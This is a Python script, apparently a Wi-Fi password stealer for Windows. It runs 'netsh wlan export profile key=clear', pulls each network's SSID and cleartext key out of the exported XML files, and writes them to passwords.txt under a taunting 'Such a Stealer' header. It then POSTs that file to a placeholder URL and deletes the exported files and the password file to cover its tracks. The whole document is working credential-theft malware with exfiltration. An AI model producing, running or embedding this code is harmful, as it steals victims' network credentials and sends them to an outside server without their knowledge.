import subprocess
import os
import requests
import tempfile


#Create a Wifi Password file

password_file=open('passwords.txt','w')
password_file.write("Haha! You are Such a Stealer \n\n")
password_file.close()

#Lists to Store data
wifi_files=[]
wifi_name=[]
wifi_password=[]

def unique_wifi(value):
    if value not in wifi_name:
        wifi_name.append(value)

#Execute a Windows Commands
command =subprocess.run(["netsh","wlan","export","profile","key=clear"],capture_output=True).stdout.decode()

#Get Current Directory
path=os.getcwd()

#Extract Necessary data from wifi files
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
for file in wifi_files:
    with open(file,'r') as f:
            for line in f.readlines():
                if "keyMaterial" in line:
                    with open(file,'r') as f:
                        for line in f.readlines():
                            stripped=line.strip()
                            if 'name' in line:
                                front=stripped[6:]
                                name =front[:-7]
                                unique_wifi(name)
                            if 'keyMaterial' in line:
                                front=stripped[13:]
                                password =front[:-14]
                                wifi_password.append(password)

#write the data in passwords.txt and send to website
with open("passwords.txt","a") as f:                
    for x,y in zip(wifi_name,wifi_password):
        f.write("SSID: " + x + "Password: "+ y + '\n')

           
#send a passwords to website
url="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
with open('passwords.txt','rb') as f:
        r=requests.post(url,data=f)

#Deleting files
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        try:
            os.remove(filename)
        except Exception as e:
            pass
try:
    os.remove("passwords.txt")
except Exception as e:
    pass